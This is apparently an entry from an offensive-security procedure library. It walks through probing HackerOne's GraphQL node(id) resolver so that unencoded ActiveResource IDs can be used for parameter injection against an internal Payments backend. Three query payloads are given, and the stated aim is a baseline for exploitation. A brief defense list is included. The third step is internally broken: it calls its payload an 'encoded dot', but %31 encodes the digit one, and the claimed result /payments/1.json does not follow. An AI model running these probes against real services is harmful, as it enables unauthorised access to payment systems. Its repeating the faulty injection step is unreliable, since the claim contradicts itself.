---
tags:
  - graphql
  - activeresource
  - parameter-injection
type: procedure
tools:
  - '[[tools/ActiveResource]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/query-standard-global-id]]'
  - '[[commands/query-non-integer-id]]'
  - '[[commands/inject-encoded-dot]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:53.626Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 4071ef6e-f100-44cf-b3f2-1d7c7d6d2e5a
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-GraphQL-Node-Interface

## Summary

This procedure tests the GraphQL node interface's handling of global IDs for ActiveResource models to confirm lack of encoding and validation, enabling subsequent parameter injection attacks on the Payments backend.

## Description

In HackerOne's system, the GraphQL node(id) resolver uses ActiveResource to fetch data from an internal Payments backend. Without proper URL encoding of the resource identifier, attackers can manipulate the ID to alter backend requests. This procedure verifies normal translation, tolerance for invalid IDs, and path manipulation via encoded characters, targeting Web platforms with Ruby/Rails/GraphQL stacks.

## Requirements

1. Access to the GraphQL API endpoint (e.g., via API key or public access)
2. GraphQL client (e.g., curl, Postman, or GraphiQL)
3. Knowledge of global ID schema (gid://hackerone/PaymentsLibrary::Payment/ID)

## Defense

Defensive measures and detection strategies:

- Implement strict ID validation and URL encoding in ActiveResource wrappers
- Monitor GraphQL queries for suspicious encoded characters (%3f, %26)
- Use constant-time responses to prevent timing oracles

## Objectives

1. Confirm ActiveResource decodes IDs without re-encoding
2. Verify path injection feasibility
3. Establish baseline for exploitation

## Instructions

### Step 1: Query Standard Global ID

**Context**: Test normal behavior to ensure the interface translates IDs to backend calls.

**Command** ([[commands/query-standard-global-id]]):
```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/1") { ... on User { id } } }
```

> This triggers an ActiveResource find, resulting in HTTP GET /payments/1. Expect a type mismatch error but confirm the request fires.

### Step 2: Test Non-Integer Identifier

**Context**: Check if ActiveResource tolerates non-numeric IDs without validation.

**Command** ([[commands/query-non-integer-id]]):
```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/something") { ... on User { id } } }
```

> Results in GET /payments/something; no exception indicates lack of encoding checks.

### Step 3: Inject Encoded Dot for Path Appending

**Context**: Demonstrate decoding of encoded characters to manipulate the path.

**Command** ([[commands/inject-encoded-dot]]):
```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%31") { ... on User { id } } }
```

> Decodes to /payments/1.json; confirms injection without path breakage.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/query-standard-global-id]]
- [[commands/query-non-integer-id]]
- [[commands/inject-encoded-dot]]

## Tools Used

- [[tools/ActiveResource]]

## Tags

- graphql
- activeresource
- reconnaissance
